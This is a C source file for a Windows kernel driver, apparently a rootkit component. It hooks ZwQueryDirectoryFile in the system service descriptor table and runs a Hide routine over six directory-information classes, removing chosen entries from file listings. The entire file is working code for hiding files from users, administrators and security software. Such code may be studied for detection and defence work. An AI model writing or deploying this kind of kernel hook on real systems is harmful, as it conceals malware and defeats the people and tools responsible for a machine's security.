#include "hide/file/filehider.h"

#include <ntddk.h>
#include <wchar.h>
#include <Ntifs.h>

#include "hide/file/filehider_algorithm.h"
#include "hook/hookfactory.h"
#include "hook/ssdt_utils.h"
#include "dbgutils.h"


wchar_t wchar_ZwQueryDirectoryFile[] = L"ZwQueryDirectoryFile";

s_SSTHook hook;
NtQueryDirectoryFile_t originalFunction;

int filehider_init()
{
    int success = ssdt_hook_w(&hook,
                              file_hook_function,
                              wchar_ZwQueryDirectoryFile,
                              sizeof(wchar_ZwQueryDirectoryFile));
    if( !success )
        return ( 0 );

    originalFunction = (NtQueryDirectoryFile_t)(hook.org_func);

    return ( 1 );
}

int filehider_deinit()
{
    return ( disclaim_hook(&hook) );
}

NTSTATUS file_hook_function(IN HANDLE FileHandle,
                            IN HANDLE Event OPTIONAL,
                            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
                            IN PVOID ApcContext OPTIONAL,
                            OUT PIO_STATUS_BLOCK IoStatusBlock,
                            OUT PVOID FileInformation,
                            IN ULONG FileInformationLength,
                            IN FILE_INFORMATION_CLASS FileInformationClass,
                            IN BOOLEAN ReturnSingleEntry,
                            IN PUNICODE_STRING FileName OPTIONAL,
                            IN BOOLEAN RestartScan)
{
    //DEBUG_PRINT("filehider::hook_function %d\n", FileInformationClass);

    NTSTATUS status =  originalFunction(FileHandle,
                                        Event,
                                        ApcRoutine,
                                        ApcContext,
                                        IoStatusBlock,
                                        FileInformation,
                                        FileInformationLength,
                                        FileInformationClass,
                                        ReturnSingleEntry,
                                        FileName,
                                        RestartScan);

    if ( !NT_SUCCESS(status) )
        return ( status );


//    status = hide(...);
//
//    if ( !NT_SUCCESS(status) )
//        return ( status );
//
//    return ( STATUS_SUCCESS );


    PVOID curr, prev;


//    if ( ReturnSingleEntry )

    switch ( FileInformationClass )
    {
    case FileDirectoryInformation:          // 1  , FILE_DIRECTORY_INFORMATION
        Hide(FILE_DIRECTORY_INFORMATION, curr, prev, FileInformation, FileInformationLength);
        break;

    case FileFullDirectoryInformation:      // 2  , FILE_FULL_DIRECTORY_INFORMATION
        Hide(FILE_FULL_DIRECTORY_INFORMATION, curr, prev, FileInformation, FileInformationLength);
        break;

    case FileBothDirectoryInformation:      // 3  , FILE_BOTH_DIR_INFORMATION
        Hide(FILE_BOTH_DIR_INFORMATION, curr, prev, FileInformation, FileInformationLength);
        break;

    case FileNamesInformation:              // 12 , FILE_NAMES_INFORMATION
        Hide(FILE_NAMES_INFORMATION, curr, prev, FileInformation, FileInformationLength);
        break;

    case FileIdBothDirectoryInformation:    // 37 , FILE_ID_BOTH_DIR_INFORMATION
        Hide(FILE_ID_BOTH_DIR_INFORMATION, curr, prev, FileInformation, FileInformationLength);
        break;

    case FileIdFullDirectoryInformation:    // 38 , FILE_ID_FULL_DIR_INFORMATION
        Hide(FILE_ID_FULL_DIR_INFORMATION, curr, prev, FileInformation, FileInformationLength);
        break;

    default:
        break;

    }

    return ( status );
}

